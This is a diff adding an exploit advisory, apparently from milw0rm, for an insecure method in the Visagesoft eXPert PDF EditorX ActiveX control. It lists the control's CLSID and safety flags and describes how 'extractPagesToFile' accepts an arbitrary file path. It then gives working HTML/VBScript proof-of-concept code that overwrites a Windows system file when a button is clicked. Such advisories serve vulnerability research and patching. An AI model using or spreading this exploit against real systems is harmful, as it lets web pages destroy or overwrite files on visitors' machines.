@@ -1,0 +1,39 @@
+VISAGESOFT eXPert PDF EditorX (VSPDFEditorX.ocx) INSECURE METHOD
+ SITE: http://www.visagesoft.com
+ 
+ This was written for educational purpose. Use it at your own risk.
+ Author will be not responsible for any damage.
+ Author: Marco Torti
+ mail: marcotorti2[at]yahoo[dot]com
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+ FileVersion:   1.0.200.0
+ CLSID:  {89F968A1-DBAC-4807-9B3C-405A55E4A279}
+ Description: Visagesoft eXPert PDF EditorX
+ ProgID:        VSPDFEditorX.VSPDFEdit
+ 
+  Marked as:
+  RegKey Safe for Script: False
+  RegKey Safe for Init: False
+  Implements IObjectSafety: True
+  IDisp Safe: Safe for untrusted: caller,data 
+  IPStorage Safe: Safe for untrusted: caller,data
+  KillBitSet: False
+ 
+ ---Vulnerable method:
+ ---extractPagesToFile(ByVal Filename  As String ,ByVal PagesRange  As String )
+
+ ---Vulnerability Description:
+    The "extractPagesToFile" method doesn't check user supplied arguments so we
+    can save/overwrite a specified file passed as argument.
+ Tested on Windows XP Professional SP3 fully patched, with Internet Explorer 7
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+<object classid='clsid:89F968A1-DBAC-4807-9B3C-405A55E4A279' id='target'/></object>
+<input language=VBScript onclick=launch() type=button value='start'>
+<script language='vbscript'>
+Sub launch
+target.extractPagesToFile "c:\windows\-system.ini","defaultV"
+MsgBox"Exploit Completed.. file overwrite!"
+End Sub
+</script>
+
+# milw0rm.com [2008-12-05]
